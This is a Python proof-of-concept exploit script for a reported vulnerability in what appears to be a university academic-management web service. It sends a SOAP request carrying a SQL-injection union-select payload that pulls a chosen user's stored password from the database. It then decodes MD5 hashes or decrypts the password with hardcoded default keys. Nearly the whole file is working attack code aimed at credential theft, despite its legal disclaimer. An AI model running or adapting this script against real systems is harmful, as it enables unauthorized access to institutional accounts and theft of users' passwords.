# -*- coding: utf-8 -*-
"""
    zf.py
    ~~~~~~~~~
    POC of http://wooyun.org/bugs/wooyun-2015-0122523

    Author: Chaobin Zhang

    Legal Disclaimer: Usage of this script for attacking targets without prior
    mutual consent is illegal. It is the end user's responsibility to obey all
    applicable local, state and federal laws. Developers assume no liability
    and are not responsible for any misuse or damage caused by this program.
"""

import argparse
import base64
import re
import requests
import sys

KEYS = ['Encrypt01', 'Acxylf365jw']


def decode(value, key):
    length_of_value = len(value)
    if length_of_value % 2 == 0:
        mid = length_of_value / 2
        # Split value in the middle -> reverse -> concatenate
        value = value[:mid][::-1] + value[mid:][::-1]
    k = 0
    result = ''
    for v in value:
        c = ord(v)
        bl_1 = 1 if c ^ ord(key[k]) < 32 else 0
        bl_2 = 1 if c ^ ord(key[k]) > 126 else 0
        bl_3 = (1 if c < 0 else 0) | (bl_1 | bl_2)
        bl_4 = (1 if c > 255 else 0) | bl_3
        if bl_4:
            result += v
        else:
            result += chr(c ^ ord(key[k]))
        k = 0 if k + 1 == len(key) else k + 1
    return result


def get_password(target, user):
    data = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
      <xh xsi:type="xsd:string">222222' union select Null,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='%s</xh>
      <xnxq xsi:type="xsd:string">2013-2014-1</xnxq>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:GetStuCheckinInfo>
  </soap:Body>
</soap:Envelope>""" % (user)
    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '\"http://www.zf_webservice.com/GetStuCheckinInfo \"'
    }
    res = requests.post(target + '/service.asmx', headers=headers, data=data)
    password = re.findall('<xh xsi:type="xsd:string">(.+?)</xh>',
                          res.text, re.S)
    if len(password) != 1:
        print '[ERROR] Can not retrive %s\'s password' % (user)
        sys.exit(-1)
    password = password[0]
    print '[-] The encrypted password of %s is: %s' % (user, password)
    MD5_HEAD = '{MD5}'
    if password.startswith(MD5_HEAD):
        print '[-] Password in MD5 form: %s' % (
            base64.b64decode(password[len(MD5_HEAD):]).encode('hex'))
    else:
        yes = raw_input(
            '[*] Do you want to decrypt the password using the default keys? ')
        if yes == 'y' or yes == 'yes':
            for k in KEYS:
                print '[-] Key ' + k + ': ' + decode(password, k)


def main(argv):
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', type=str,
                        help='The target address you want to test.')
    parser.add_argument('-u', '--user', type=str,
                        help='The user you want to get password from.')
    args = vars(parser.parse_args(argv))
    if args['user'] is None:
        args['user'] = 'jwc01'
    target = args['target']
    if target is None:
        target = raw_input(
            '[*] Please input your target, like "http://xx.edu.cn": ')
    HTTP = 'http://'
    if not target.startswith(HTTP):
        target = HTTP + target

    get_password(target, args['user'])


if __name__ == '__main__':
    main(sys.argv[1:])
